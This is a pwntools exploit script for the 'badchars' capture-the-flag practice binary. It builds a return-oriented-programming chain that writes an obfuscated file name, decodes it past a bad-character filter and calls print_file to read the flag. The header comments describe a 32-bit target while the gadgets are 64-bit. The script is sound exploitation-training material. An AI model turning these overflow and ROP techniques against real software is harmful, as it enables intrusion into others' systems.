#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./badchars32
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or "./badchars")
context.delete_corefiles = True
context.terminal = ["alacritty", "-e", "sh", "-c"]
rop = ROP(exe)

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    """Start the exploit against the target."""
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = """
break *pwnme+268
continue
""".format(
    **locals()
)

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x8048000)
# RUNPATH:  b'.'
# io = start()
# io.sendline(cyclic(100, alphabet="QWERT"))
# io.wait()

# offset = cyclic_find(io.corefile.read(io.corefile.rsp, 4), alphabet="QWERT")
# info(offset)

io = start()

offset = 40

pop_r12_r13_r14_r15 = rop.find_gadget(
    ["pop r12", "pop r13", "pop r14", "pop r15", "ret"]
)[0]
pop_r15 = rop.find_gadget(["pop r15", "ret"])[0]
pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
write_r13_r12 = 0x400634
sub_r15_r14 = 0x400630
data_section = exe.symbols["data_start"] + 0x8
print_file = exe.symbols["print_file"]

info(data_section)

badChars = ["x", "g", "a", "."]

fileName = "flbh/tyt"
#           01234567
info(hex(data_section))
info(hex(data_section + 0x6))


payload = flat(
    offset * b"A",
    pop_r12_r13_r14_r15,
    fileName,  # r12
    data_section,  # r13
    0x1,  # r14
    data_section,  # r15
    write_r13_r12,
    pop_r15,
    data_section + 0x2,
    sub_r15_r14,
    pop_r15,
    data_section + 0x3,
    sub_r15_r14,
    pop_r15,
    data_section + 0x4,
    sub_r15_r14,
    pop_r15,
    data_section + 0x6,
    sub_r15_r14,
    pop_rdi,
    data_section,
    print_file,
    0x0,
)

io.sendline(payload)


io.interactive()
